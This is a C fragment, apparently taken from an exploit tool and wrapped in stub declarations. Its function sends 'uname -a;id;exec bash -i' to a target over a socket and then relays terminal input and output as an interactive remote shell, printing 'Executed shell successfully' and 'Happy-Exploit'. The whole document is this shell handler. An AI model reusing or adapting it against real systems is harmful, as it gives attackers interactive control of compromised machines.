
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct timeval {int tv_sec; int tv_usec; } ;
typedef int rbuf ;
typedef int fd_set ;


 int D_M ;
 scalar_t__ FD_ISSET (int,int *) ;
 int FD_SET (int,int *) ;
 int FD_ZERO (int *) ;
 int STDIN_FILENO ;
 int exit (int) ;
 int fflush (int ) ;
 int fprintf (int ,char*,...) ;
 int memset (char*,int,int) ;
 int read (int,char*,int) ;
 int select (int,int *,int *,int *,struct timeval*) ;
 int send (int,char*,int ,int) ;
 int stdout ;
 int strlen (char*) ;
 int write (int,char*,int) ;

void send_recv_sh(int sock)
{
 int pk;
 struct timeval tm;
 char *t_cmd="uname -a;id;exec bash -i\n";
 char rbuf[1024];
 fd_set rset;
 memset((char *)rbuf,D_M,sizeof(rbuf));
 fprintf(stdout," [*] Executed shell successfully !\n\n");
 send(sock,t_cmd,strlen(t_cmd),D_M);

 tm.tv_sec=10;
 tm.tv_usec=D_M;

 while(1)
 {
  fflush(stdout);
  FD_ZERO(&rset);
  FD_SET(sock,&rset);
  FD_SET(STDIN_FILENO,&rset);

  select(sock+1,&rset,((void*)0),((void*)0),&tm);

  if(FD_ISSET(sock,&rset))
  {
   pk=read(sock,rbuf,sizeof(rbuf)-1);
   if(pk<=D_M)
   {
    fprintf(stdout," [*] Happy-Exploit\n\n");
    exit(D_M);
   }
   rbuf[pk]=D_M;
   fprintf(stdout,"%s",rbuf);
  }
  if(FD_ISSET(STDIN_FILENO,&rset))
  {
   pk=read(STDIN_FILENO,rbuf,sizeof(rbuf)-1);
   if(pk>D_M)
   {
    rbuf[pk]=D_M;
    write(sock,rbuf,pk);
   }
  }
 }
 return;
}
